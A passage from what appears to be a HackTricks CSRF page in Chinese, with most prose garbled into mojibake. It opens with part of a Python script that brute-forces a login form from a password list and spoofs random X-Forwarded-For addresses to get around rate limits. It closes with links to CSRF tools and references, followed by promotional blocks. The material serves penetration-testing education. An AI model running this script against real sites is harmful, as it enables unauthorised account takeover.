"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## å·¥å…· <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## å‚è€ƒèµ„æ–™

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

â€‹

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢æ´å¯Ÿ**\
æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€å’ŒæŒ‘æˆ˜

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œæ´å¯Ÿï¼Œè·Ÿä¸Šå¿«èŠ‚å¥çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
é€šè¿‡æœ€æ–°çš„æ¼æ´èµé‡‘å‘å¸ƒå’Œå…³é”®å¹³å°æ›´æ–°ï¼Œä¿æŒä¿¡æ¯çš„æ›´æ–°

**åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **ï¼Œä»Šå¤©å°±å¼€å§‹ä¸é¡¶å°–é»‘å®¢åˆä½œï¼**

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricks** ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF** ç‰ˆæœ¬ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs**](https://opensea.io/collection/the-peass-family) æ”¶è—
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
